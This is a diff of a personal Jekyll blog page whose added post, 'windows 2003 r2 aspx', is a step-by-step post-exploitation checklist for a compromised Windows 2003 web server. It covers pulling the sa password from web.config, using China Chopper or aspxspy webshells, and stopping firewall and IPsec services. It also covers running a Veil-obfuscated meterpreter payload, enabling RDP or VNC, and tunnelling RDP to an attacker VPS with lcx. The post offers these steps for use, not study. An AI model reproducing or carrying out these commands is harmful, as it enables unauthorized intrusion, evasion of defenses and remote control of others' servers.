@@ -4,7 +4,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>quanyechavshuo</title>
+<title>windows 2003 r2 aspx</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="http://gmpg.org/xfn/11" />
@@ -70,89 +70,129 @@
 
     <div class="page-content">
       <div class="wrap">
-      <div class="container-fluid index">
-    <div class="row">
+      
 
-        <div class="col-md-12 main content-panel">
+<div class="container-fluid single">
+  <div class="row">
 
-            <div class="gravatar">
-                <img src="https://raw.githubusercontent.com/xinghuacai/pic/master/1.png" class="img-circle about-image" height="150" width="150" alt="quanyechavshuo" />
-            </div>
+    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
+      
+      <div class="thumb">
+        <i class="fa fa-heart fa-4x"></i>
+      </div>
+      
 
-            <h1 class="header author-header" itemprop="headline">quanyechavshuo</h1>
+      <h1 class="header" itemprop="name">windows 2003 r2 aspx</h1>
 
-            <div class="author-text">
-                A guy want to be a strong man
-            </div>
+      <div class="author">
+        <small><i>
+          
+          by
+          <span itemprop="author">
+            
+            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+              <span itemprop="name">quanyechavshuo</span>
+            </span>
+            
+          </span>
+          
+          on <span itemprop="datePublished" content="2014-08-28">April 9, 2016</span>
+           under web
+        </i></small>
+      </div>
 
-            <p class="links">
-  <a href="http://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
-  <a href="https://github.com/quanyechavshuo" target="_new"><i class="fa fa-github-alt"></i></a>
-  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
-</p>
+      <div class="read-time">
+        <small>
+          1 minute read
+        </small>
+      </div>
 
-          </div>
-          <div class="col-md-12 main content-panel">
+      <div class="content-panel content">
 
-            <div class="articles">
+        
 
-              <h2>Latest Articles</h2>
+        <span itemprop="articleBody"><h3 id="search-webconfig-to-find-sa-and-sa-password">1&gt;search web.config———&gt; to find sa and sa password</h3>
 
-              <ul>
-                  
+<h3 id="choppperor-aspxspyto-connect-dbget">2&gt;choppper(or aspxspy)to connect db,get</h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>sometimes aspxspy.aspx cannot get system privileges with sa and pass,try chopper.  
+</code></pre>
+</div>
 
-                      <li>
-                          <a href="/web/2016/04/09/windows-2003-r2-aspx/">windows 2003 r2 aspx</a>
-                          <small class="hidden-xs">April 9, 2016</small>
-                      </li>
+<h3 id="net-stop-sharedaccess">3&gt;net stop sharedaccess</h3>
 
-                  
+<h3 id="net-stop-policyagent">4&gt;net stop policyagent</h3>
 
-                      <li>
-                          <a href="/jekyll/2016/04/09/github-jekyll-blog/">Use github and jekyll start github pages</a>
-                          <small class="hidden-xs">April 9, 2016</small>
-                      </li>
+<h3 id="use-sa-pri-run-meterpreteruse-veil-to-jail-payload">5&gt;use sa pri run meterpreter(use veil to jail) payload</h3>
 
-                  
+<h3 id="use-meterpreter-shell-to-open-vnc-or-desktop">6&gt;use meterpreter shell to open vnc or desktop</h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter&gt;run vnc
+or
+meterpreter&gt;background
+msf&gt;use post/windows/manage/enable_rdp
+</code></pre>
+</div>
 
-                      <li>
-                          <a href="/jekyll/2015/03/23/welcome-to-carte-noir/">Welcome to Carte Noire</a>
-                          <small class="hidden-xs">March 23, 2015</small>
-                      </li>
+<h3 id="if-6-failuse-sa-privilegesin-chopperto-run">7&gt;if 6 fail,use sa privileges(in chopper)to run:</h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>victim:lcx -slave vps_ip vps_port victim_ip 3389
+vps:lcx -listen vps_port 1234
+vps:mstsc /console /v:127.0.0.1:1234  
 
-                  
+Notice:normally,mstsc----&gt;127.0.0.1:1234 is ok,sometimes exists connect num restrict,use it.in win7: need runas admin,and use:mstsc /console /v:127.0.0.1:1234 -admin
+</code></pre>
+</div>
+</span>
 
-                      <li>
-                          <a href="/jekyll/2014/06/10/carte-noire-in-action/">Carte Noire in Action</a>
-                          <small class="hidden-xs">June 10, 2014</small>
-                      </li>
+        
 
-                  
 
-                      <li>
-                          <a href="/jekyll/2014/06/09/so-what-is-jekyll/">So, What is Jekyll?</a>
-                          <small class="hidden-xs">June 9, 2014</small>
-                      </li>
-
-                  
-
-                      <li>
-                          <a href="/jekyll/2014/06/08/using-thumbnails/">Using thumbnails</a>
-                          <small class="hidden-xs">June 8, 2014</small>
-                      </li>
-
-                  
-                  <li>
-                      <small><i><a href="/posts/">more...</a></i></small>
-                  </li>
-              </ul>
-
-            </div>
-
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            windows, aspx
+          </small>
         </div>
+        
+
+      </div>
+
+      
+      <div class="content-panel feedback">
+        I <i class="fa fa-heart"></i> feedback.<br />
+        Let me know what you think of this article on twitter <a href="http://www.twitter.com/quanyechavshuo">@quanyechavshuo</a> or leave a comment below!
+      </div>
+      
+
+      
+      <div class="content-panel comments">
+        <div id="disqus_thread">
+          <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+      </div>
+      
+
+      
 
     </div>
+
+  </div>
+
 </div>
+
+
+<script type="text/javascript">
+/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+function disqus_config() { this.experiment.enable_scroll_container = true; }
+var disqus_shortname = "cartenoire"; // required: replace example with your forum shortname
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+
 
       </div>
     </div>
@@ -183,48 +223,6 @@
    });
 </script>
 
-
-<script type="text/javascript">
-
-  function setFontSize() {
-
-    var title, dateOfTitle, fontSizeOfTitle, listOfA, listOfSmall, listOfArticlesDiv, divWidth;
-
-    listOfArticlesDiv = document.getElementsByClassName("articles");
-
-    for (i = 0; i < listOfArticlesDiv.length; i++) {
-
-      listOfA = document.getElementsByClassName("articles")[i].getElementsByTagName("a");
-      listOfSmall = document.getElementsByClassName("articles")[i].getElementsByTagName("small");
-
-      divWidth = document.getElementsByClassName("articles")[i].offsetWidth;
-
-      for (k = 0; k < listOfSmall.length; k++) {
-
-        title = $(listOfA[k]);
-        dateOfTitle = $(listOfSmall[k]);
-
-        fontSizeOfTitle = startingFontSize;
-        title.css("font-size", fontSizeOfTitle);
-
-        while (title.width() + dateOfTitle.width() >= divWidth)
-          title.css("font-size", fontSizeOfTitle -= 0.5);
-
-      }
-    }
-  }
-
-  function getStartFontSize() {
-    try {
-      startingFontSize = parseInt($(document.getElementsByClassName("articles")[0].getElementsByTagName("a")[0]).css("font-size"));
-      setFontSize();
-      window.addEventListener('resize', setFontSize, true);
-    } catch (e) {}
-  }
-
-  $(document).ready(getStartFontSize);
-
-</script>
 
 
 
